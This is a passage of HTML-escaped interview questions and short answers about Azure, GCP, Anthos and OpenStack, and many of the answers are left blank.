monitoring service that provides threat protection across all of the services in Azure. More specifically, it:&lt;/p&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;Provides security recommendations based on your usage&lt;/li&gt; &lt;li&gt;Monitors security settings and continuously all the services&lt;/li&gt; &lt;li&gt;Analyzes and identifies potential inbound attacks&lt;/li&gt; &lt;li&gt;Detects and blocks malware using machine learning &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is Azure Active Directory?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Azure AD is a cloud-based identity service. You can use it as a standalone service or integrate it with existing Active Directory service you already running. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is Azure Advanced Threat Protection?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What components are part of Azure ATP?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Where logs are stored in Azure Monitor?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain Azure Site Recovery&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain what the advisor does&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain VNet peering&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Which protocols are available for configuring health probe&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain Azure Active&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is a subscription? What types of subscriptions are there?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain what is a blob storage service&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;h2&gt;GCP&lt;/h2&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain GCP&#39;s architecture&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What are the main components and services of GCP?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What GCP management tools are you familiar with?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Tell me what do you know about GCP networking&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain Cloud Functions&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is Cloud Datastore?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What network tags are used for?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What are flow logs? Where are they enabled?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How do you list buckets?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; Two ways to do that: $ gsutil ls $ gcloud alpha storage ls &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What Compute metadata key allows you to run code at startup?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;startap-script &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What the following commands does? `gcloud deployment-manager deployments create`&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is Cloud Code?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; It is a set of tools to help developers write, run and debug GCP kubernetes based applications. It provides built-in support for rapid iteration, debugging and running applications in development and production K8s environments. &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;h3&gt;Google Kubernetes Engine (GKE)&lt;/h3&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is GKE&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;It is the managed kubernetes service on GCP for deploying, managing and scaling containerised applications using Google infrastructure. &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;h3&gt;Anthos&lt;/h3&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is Anthos&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; It is a managed application platform for organisations like enterprises that require quick modernisation and certain levels of consistency for their legacy applications in a hybrid or multicloud world. From this explanation the core ideas can be drawn from these statements; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Managed -&amp;gt; the customer does not need to worry about the underlying software intergrations, they just enable the API.&lt;/li&gt; &#xA;   &lt;li&gt;application platform -&amp;gt; It consists of open source tools like K8s, Knative, Istio and Tekton&lt;/li&gt; &#xA;   &lt;li&gt;Enterprises -&amp;gt; these are usually organisations with complex needs&lt;/li&gt; &#xA;   &lt;li&gt;Consistency -&amp;gt; to have the same policies declaratively initiated to be run anywhere securely e.g on-prem, GCP or other-clouds (AWS or Azure)&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;fun fact: Anthos is flower in greek, they grow in the ground (earth) but need rain from the clouds to flourish. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;List the technical components that make up Anthos&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;Infrastructure management - Google Kubernetes Engine (GKE)&lt;/li&gt; &lt;li&gt;Cluster management - GKE, Ingress for Anthos&lt;/li&gt; &lt;li&gt;Service management - Anthos Service Mesh&lt;/li&gt; &lt;li&gt;Policy enforcement - Anthos Config Management, Anthos Enterprise Data Protection, Policy Controller&lt;/li&gt; &lt;li&gt;Application deployment - CI/CD tools like Cloud Build, GitLab&lt;/li&gt; &lt;li&gt;Application development - Cloud Code &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is the primary computing environment for Anthos to easily manage workload deployment?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;Google Kubernetes Engine (GKE) &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How does Anthos handle the control plane and node components for GKE?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;On GCP the kubernetes api-server is the only control plane component exposed to customers whilst compute engine manages instances in the project. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Which load balancing options are available?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;Networking load balancing for L4 and HTTP(S) Load Balancing for L7 which are both managed services that do not require additional configuration.&lt;/li&gt; &lt;li&gt;Ingress for Anthos which allows the ability to deploy a load balancer that serves an application across multiple clusters on GKE &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Can you deploy Anthos on AWS?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;Yes, Anthos on AWS is now GA. For more read &lt;a href=&#34;https://cloud.google.com/anthos/gke/docs/aws&#34;&gt;here&lt;/a&gt; &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;List and explain the enterprise security capabilities provided by Anthos&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;Control plane security - GCP manages and maintains the K8s control plane out of the box. The user can secure the api-server by using master authorized networks and private clusters. These allow the user to disable access on the public IP address by assigning a private IP address to the master.&lt;/li&gt; &lt;li&gt;Node security - By default workloads are provisioned on Compute engine instances that use Google&#39;s Container Optimised OS. This operating system implements a locked-down firewall, limited user accounts with root disabled and a read-only filesystem. There is a further option to enable GKE Sandbox for stronger isolation in multi-tenant deployment scenarios.&lt;/li&gt; &lt;li&gt;Network security - Within a created cluster VPC, Anthos GKE leverages a powerful software-defined network that enables simple Pod-to-Pod communications. Network policies allow locking down ingress and egress connections in a given namespace. Filtering can also be implemented to incoming load-balanced traffic for services that require external access, by supplying whitelisted CIDR IP ranges.&lt;/li&gt; &lt;li&gt;Workload security - Running workloads run with limited privileges, default Docker AppArmor security policies are applied to all Kubernetes Pods. Workload identity for Anthos GKE aligns with the open source kubernetes service accounts with GCP service account permissions.&lt;/li&gt; &lt;li&gt;Audit logging - Adminstrators are given a way to retain, query, process and alert on events of the deployed environments. &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How can workloads deployed on Anthos GKE on-prem clusters securely connect to Google Cloud services?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;Google Cloud Virtual Private Network (Cloud VPN) - this is for secure networking&lt;/li&gt; &lt;li&gt;Google Cloud Key Management Service (Cloud KMS) - for key management &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is Island Mode configuration with regards to networking in Anthos GKE deployed on-prem?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;This is when pods can directly talk to each other within a cluster, but cannot be reached from outside the cluster thus forming an &#34;island&#34; within the network that is not connected to the external network. &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain Anthos Config Management&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;It is a core component of the Anthos stack which provides platform, service and security operators with a single, unified approach to multi-cluster management that spans both on-premises and cloud environments. It closely follows K8s best practices, favoring declarative approaches over imperative operations, and actively monitors cluster state and applies the desired state as defined in Git. It includes three key components as follows:&lt;/p&gt; &lt;/b&gt;&#xA; &lt;ol&gt;&#xA;  &lt;b&gt; &lt;li&gt;An importer that reads from a central Git repository&lt;/li&gt; &lt;li&gt;A component that synchronises stored configuration data into K8s objects&lt;/li&gt; &lt;li&gt;A component that monitors drift between desired and actual cluster configurations with a capability of reconciliation when need rises. &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ol&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How does Anthos Config Management help?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;It follows common modern software development practices which makes cluster configuration, management and policy changes auditable, revertable, and versionable easily enforcing IT governance and unifying resource management in an organisation. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is Anthos Service Mesh?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;It is a suite of tools that assist in monitoring and managing deployed services on Anthos of all shapes and sizes whether running in cloud, hybrid or multi-cloud environments. It leverages the APIs and core components from Istio, a highly configurable and open-source service mesh platform. &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Describe the two main components of Anthos Service Mesh&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ol&gt;&#xA;  &lt;b&gt; &lt;li&gt;Data plane - it consists of a set of distributed proxies that mediate all inbound and outbound network traffic between individual services which are configured using a centralised control plane and an open API&lt;/li&gt; &lt;li&gt;Control plane - is a fully managed offering outside of Anthos GKE clusters to simplify management overhead and ensure highest possible availability. &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ol&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What are the components of the managed control plane of Anthos Service Mesh?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ol&gt;&#xA;  &lt;b&gt; &lt;li&gt;Traffic Director - it is GCP&#39;s fully managed service mesh traffic control plane, responsible for translating Istio API objects into configuration information for the distributed proxies, as well as directing service mesh ingress and egress traffic&lt;/li&gt; &lt;li&gt;Managed CA - is a centralised certificate authority responsible for providing SSL certificates to each of the distributed proxies, authentication information and distributing secrets&lt;/li&gt; &lt;li&gt;Operations tooling - formerly stackdriver, provides a managed ingestion point for observability and telemetry, specifically monitoring, tracing and logging data generated by each of the proxies. This powers the observability dashboard for operators to visually inspect their services and service dependencies assisting in the implementation of SRE best practices for monitoring SLIs and establishing SLOs. &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ol&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How does Anthos Service Mesh help?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; Tool and technology integration that makes up Anthos service mesh delivers signficant operational benefits to Anthos environments, with minimal additional overhead such as follows: &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;Uniform observability - the data plane reports service to service communication back to the control plane generating a service dependency graph. Traffic inspection by the proxy inserts headers to facilitate distributed tracing, capturing and reporting service logs together with service-level metrics (i.e latency, errors, availability).&lt;/li&gt; &lt;li&gt;Operational agility - fine-grained controls for managing the flow of inter-mesh (north-south) and intra-mesh (east-west) traffic are provided.&lt;/li&gt; &lt;li&gt;Policy-driven security - policies can be enforced consistently across diverse protocols and runtimes as service communications are secured by default. &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;List possible use cases of traffic controls that can be implemented within Anthos Service Mesh&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;Traffic splitting across differing service versions for canary or A/B testing&lt;/li&gt; &lt;li&gt;Circuit breaking to prevent cascading failures&lt;/li&gt; &lt;li&gt;Fault injection to help build resilient and fault-tolerant deployments&lt;/li&gt; &lt;li&gt;HTTP header-based traffic steering between individual services or versions &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is Cloud Run for Anthos?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;It is part of the Anthos stack that brings a serverless container experience to Anthos, offering a high-level platform experience on top of K8s clusters. It is built with Knative, an open-source operator for K8s that brings serverless application serving and eventing capabilities. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How does Cloud Run for Anthos simplify operations?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;Platform teams in organisations that wish to offer developers additional tools to test, deploy and run applications can use Knative to enhance this experience on Anthos as Cloud Run. Below are some of the benefits;&lt;/p&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;Easy migration from K8s deployments - Without Cloud Run, platform engineers have to configure deployment, service, and HorizontalPodAutoscalers(HPA) objects to a loadbalancer and autoscaling. If application is already serving traffic it becomes hard to change configurations or roll back efficiently. Using Cloud Run all this is managed thus the Knative service manifest describes the application to be autoscaled and loadbalanced&lt;/li&gt; &lt;li&gt;Autoscaling - a sudden traffic spike may cause application containers in K8s to crash due to overload thus an efficient automated autoscaling is executed to serve the high volume of traffic&lt;/li&gt; &lt;li&gt;Networking - it has built-in load balancing capabilities and policies for traffic splitting between multiple versions of an application.&lt;/li&gt; &lt;li&gt;Releases and rollouts - supports the notion of the Knatibe API&#39;s revisions which describe new versions or different configurations of your application and canary deployments by splitting traffic.&lt;/li&gt; &lt;li&gt;Monitoring - observing and recording metrics such as latency, error rate and requests per second. &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;List and explain three high-level out of the box autoscaling primitives offered by Cloud Run for Anthos that do not exist in K8s natively&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;Rapid, request-based autoscaling - default autoscalers monitor request metrics which allows Cloud Run for Anthos to handle spiky traffic patterns smoothly&lt;/li&gt; &lt;li&gt;Concurrency controls - limits such as max in-flight requests per container are enforced to ensure the container does not become overloaded and crash. More containers are added to handle the spiky traffic, buffering the requests.&lt;/li&gt; &lt;li&gt;Scale to zero - if an application is inactive for a while Cloud Run scales it down to zero to reduce its footprint. Alternatively one can turn off scale-to-zero to prevent cold starts. &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;List some Cloud Run for Anthos use cases&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;As it does not support stateful applications or sticky sessions, it is suitable for running stateless applications such as:&lt;/p&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;Machine learning model predictions e.g Tensorflow serving containers&lt;/li&gt; &lt;li&gt;API gateways, API middleware, web front ends and Microservices&lt;/li&gt; &lt;li&gt;Event handlers, ETL &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;h2&gt;OpenStack&lt;/h2&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What components/projects of OpenStack are you familiar with?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Can you tell me what each of the following services/projects is responsible for?: &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Nova&lt;/li&gt; &#xA;   &lt;li&gt;Neutron&lt;/li&gt; &#xA;   &lt;li&gt;Cinder&lt;/li&gt; &#xA;   &lt;li&gt;Glance&lt;/li&gt; &#xA;   &lt;li&gt;Keystone&lt;/li&gt;&#xA;  &lt;/ul&gt;&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt;  &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;Nova - Manage virtual instances&lt;/li&gt; &lt;li&gt;Cinder - Block Storage&lt;/li&gt; &lt;li&gt;Keystone - Authentication service across the cloud &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Identify the service/project used for each of the following: &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Copy or snapshot instances&lt;/li&gt; &#xA;   &lt;li&gt;GUI for viewing and modifying resources&lt;/li&gt; &#xA;   &lt;li&gt;Block Storage&lt;/li&gt; &#xA;   &lt;li&gt;Manage virtual instances&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;Glance - Images Service. Also used for copying or snapshot instances&lt;/li&gt; &lt;li&gt;Horizon - GUI for viewing and modifying resources&lt;/li&gt; &lt;li&gt;Cinder - Block Storage&lt;/li&gt; &lt;li&gt;Nova - Manage virtual instances &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is a tenant/project?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Determine true or false: &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;OpenStack is free to use&lt;/li&gt; &#xA;   &lt;li&gt;The service responsible for networking is Glance&lt;/li&gt; &#xA;   &lt;li&gt;The purpose of tenant/project is to share resources between different projects and users of OpenStack&lt;/li&gt;&#xA;  &lt;/ul&gt;&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Describe in detail how you bring up an instance with a floating IP&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;You get a call from a customer saying: &#34;I can ping my instance but can&#39;t connect (ssh) it&#34;. What might be the problem?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What types of networks OpenStack supports?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How do you debug OpenStack storage issues? (tools, logs, ...)&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How do you debug OpenStack compute issues? (tools, logs, ...)&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;h4&gt;OpenStack Deployment &amp;amp; TripleO&lt;/h4&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Have you deployed OpenStack in the past? If yes, can you describe how you did it?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Are you familiar with TripleO? How is it different from Devstack or Packstack?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;You can read about TripleO right &lt;a href=&#34;https://docs.openstack.org/tripleo-docs/latest&#34;&gt;here&lt;/a&gt; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;h4&gt;OpenStack Compute&lt;/h4&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Can you describe Nova in detail?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;Used to provision and manage virtual instances&lt;/li&gt; &lt;li&gt;It supports Multi-Tenancy in different levels - logging, end-user control, auditing, etc.&lt;/li&gt; &lt;li&gt;Highly scalable&lt;/li&gt; &lt;li&gt;Authentication can be done using internal system or LDAP&lt;/li&gt; &lt;li&gt;Supports multiple types of block storage&lt;/li&gt; &lt;li&gt;Tries to be hardware and hypervisor agnostice &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What do you know about Nova architecture and components?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;nova-api - the server which serves metadata and compute APIs&lt;/li&gt; &lt;li&gt;the different Nova components communicate by using a queue (Rabbitmq usually) and a database&lt;/li&gt; &lt;li&gt;a request for creating an instance is inspected by nova-scheduler which determines where the instance will be created and running&lt;/li&gt; &lt;li&gt;nova-compute is the component responsible for communicating with the hypervisor for creating the instance and manage its lifecycle &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;h4&gt;OpenStack Networking (Neutron)&lt;/h4&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain Neutron in detail&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;One of the core component of OpenStack and a standalone project&lt;/li&gt; &lt;li&gt;Neutron focused on delivering networking as a service&lt;/li&gt; &lt;li&gt;With Neutron, users can set up networks in the cloud and configure and manage a variety of network services&lt;/li&gt; &lt;li&gt;Neutron interacts with: &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;Keystone - authorize API calls&lt;/li&gt; &#xA;     &lt;li&gt;Nova - nova communicates with neutron to plug NICs into a network&lt;/li&gt; &#xA;     &lt;li&gt;Horizon - supports networking entities in the dashboard and also provides topology view which includes networking details &lt;/li&gt;&#xA;    &lt;/ul&gt;&lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;    &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain each of the following components: &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;neutron-dhcp-agent&lt;/li&gt; &#xA;   &lt;li&gt;neutron-l3-agent&lt;/li&gt; &#xA;   &lt;li&gt;neutron-metering-agent&lt;/li&gt; &#xA;   &lt;li&gt;neutron-*-agtent&lt;/li&gt; &#xA;   &lt;li&gt;neutron-server&lt;/li&gt;&#xA;  &lt;/ul&gt;&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt;  &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;neutron-l3-agent - L3/NAT forwarding (provides external network access for VMs for example)&lt;/li&gt; &lt;li&gt;neutron-dhcp-agent - DHCP services&lt;/li&gt; &lt;li&gt;neutron-metering-agent - L3 traffic metering&lt;/li&gt; &lt;li&gt;neutron-*-agtent - manages local vSwitch configuration on each compute (based on chosen plugin)&lt;/li&gt; &lt;li&gt;neutron-server - exposes networking API and passes requests to other plugins if required &lt;/li&gt;&lt;/b&gt;&#xA; 